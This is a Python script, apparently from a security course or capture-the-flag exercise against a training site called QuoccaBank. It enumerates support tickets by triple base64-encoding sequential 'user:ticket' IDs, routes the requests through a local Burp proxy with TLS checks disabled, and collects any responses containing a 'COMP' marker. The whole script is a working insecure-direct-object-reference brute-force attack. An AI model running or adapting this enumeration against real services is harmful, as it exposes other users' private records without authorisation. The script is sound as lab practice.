import requests
import base64
from urllib3.exceptions import InsecureRequestWarning
import re
import time

# Silences warnings about not verifying Burp's CA certificate.
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Create a session object to save settings for the lifetime of the script.
s = requests.session()
s.verify = False  # Skip trying to verify TLS certs, due to Burp's CA.
s.proxies = {"https": "http://127.0.0.1:8080"}  # Proxy requests through Burp.

interesting = []
j = 1
i = 0
while i < 2000:
    ticket = str(i) + ":" + str(j)
    encoded_string = base64.b64encode(ticket.encode()).decode()
    encoded2_string = base64.b64encode(encoded_string.encode()).decode()
    encoded3_string = base64.b64encode(encoded2_string.encode()).decode()
    response = s.get(f"https://support-v3.quoccabank.com/raw/{encoded3_string}")
    print(ticket)
    if response.status_code == 200:
        print(str(response.content))
        j += 1
        if len(re.findall("COMP", str(response.content))) > 0:
            interesting.append(ticket)
            time.sleep(1)
            print(interesting)
    elif response.status_code == 429:
        print("too many requests")
    else:
        i += 1
        j = 1
print(interesting)